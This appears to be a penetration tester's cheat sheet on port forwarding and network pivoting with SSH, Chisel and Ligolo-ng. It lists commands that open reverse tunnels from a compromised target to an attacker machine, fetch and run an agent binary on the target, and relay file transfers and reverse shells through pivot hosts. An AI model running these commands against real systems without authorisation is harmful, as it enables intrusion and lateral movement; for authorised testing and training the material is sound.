
## Portforward

### SSH

Port 8080 on target host to port 8080 on localhost on Kali:
```
ssh -L 8080:localhost:8080 <USERNAME>@<TARGET-IP>
```

### Chisel

Binary: [link](https://github.com/jpillora/chisel/releases/tag/v1.10.0)
```bash
# Kali
./chisel server --port 9001 --reverse

# Target
./chisel client 192.168.45.183:9001 R:8888:localhost:8080
./chisel client <IP>:<port> R:<LPORT>:localhost:<RPORT>

.\chisel.exe client 192.168.45.221:9001 R:8888:localhost:1433
.\chisel.exe client <IP>:<port> R:<LPORT>:localhost:<RPORT>
```


---

## Pivot

### Ligolo (get latest binaries if errors occur!)

Get agent and proxy: [link](https://github.com/nicocha30/ligolo-ng/releases/tag/v0.7.1-alpha)

**Pivot 1**
```bash
# Kali
sudo ip tuntap add user kali mode tun ligolo  
sudo ip link set ligolo up
sudo ./proxy -selfcert -laddr 0.0.0.0:443
sudo python3 -m http.server 80 # Transfer agent

# Target
wget http://<Kali-IP>/agent
chmod +x agent
./agent -connect <Kali-IP>:443 -ignore-cert -retry
.\agent.exe -connect <Kali-IP>:443 -ignore-cert -retry
```

Add route and start session:
```bash
# In terminal
sudo ip route add 172.16.183.0/24 dev ligolo

# In ligolo window
session <enter><enter>
start
```


**Pivot 2**
```bash
# On Kali
sudo ip tuntap add user giiker mode tun ligolo2  
sudo ip link set ligolo2 up

# On Ligolo
listener_add --addr 0.0.0.0:2222 --to 127.0.0.1:80 --tcp # File transfer
listener_add --addr 0.0.0.0:8080 --to 0.0.0.0:443 --tcp

# On Target
wget http://<pivot1-IP>:2222/agent
chmod +x agent
./agent -connect <pivot1-IP>:8080 -ignore-cert
```

Add route and start session:
```bash
# In terminal
sudo ip route add 192.168.20.0/24 dev ligolo2

# In ligolo window
session <enter><enter>
start --tun ligolo2
```


**File transfer & Reverse shells**

Setup listener on ligolo session:
```bash
# Port 80 from pivot machine to port 80 on kali machine
listener_add --addr 0.0.0.0:8000 --to 0.0.0.0:80 
listener_add --addr 0.0.0.0:4445 --to 0.0.0.0:445

# On Kali
sudo python3 -m http.server 80

# On Target:
wget http://<pivot1-IP>:2222/<FILE>
```
>[!info] 
>Same story with reverse shells


**Cleanup**

Delete routes and interface:
```bash
# Pivot1
sudo ip route del 192.168.10.0/24 dev ligolo
sudo ip link delete ligolo

# Pivot2
sudo ip route del 192.168.20.0/24 dev ligolo
sudo ip link delete ligolo2
```
